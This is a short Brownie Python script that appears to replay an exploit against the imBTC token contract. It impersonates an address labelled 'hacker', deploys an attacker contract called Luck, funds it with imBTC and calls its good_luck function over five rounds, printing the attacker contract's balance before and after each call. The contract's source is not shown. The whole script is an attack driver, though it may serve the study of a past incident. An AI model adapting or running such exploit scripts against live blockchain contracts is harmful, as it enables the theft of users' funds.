from brownie import accounts, interface, Luck
from rich import print as rprint


def main():
    _imbtc = '0x3212b29E33587A00FB1C83346f5dBFA69A458923'
    hacker = accounts.at(
        '0xa9bf70a420d364e923c74448d9d817d3f2a77822', force=True)
    luck = Luck.deploy({
        'from': hacker
    })
    imbtc = interface.ERC20(_imbtc)
    imbtc.transfer(luck, imbtc.balanceOf(hacker), {
        'from': hacker
    })
    for i in range(5):
        rprint(
            f'[bold green]---------------------------- Round {i} ---------------------------------[/]')
        rprint(
            f'[bold red]before[/]: imbtc.balanceOf(attacker-contract) {imbtc.balanceOf(luck)}')
        luck.good_luck({
            'from': hacker
        })
        rprint(
            f'[bold red]After[/]: imbtc.balanceOf(attacker-contract) {imbtc.balanceOf(luck)}')
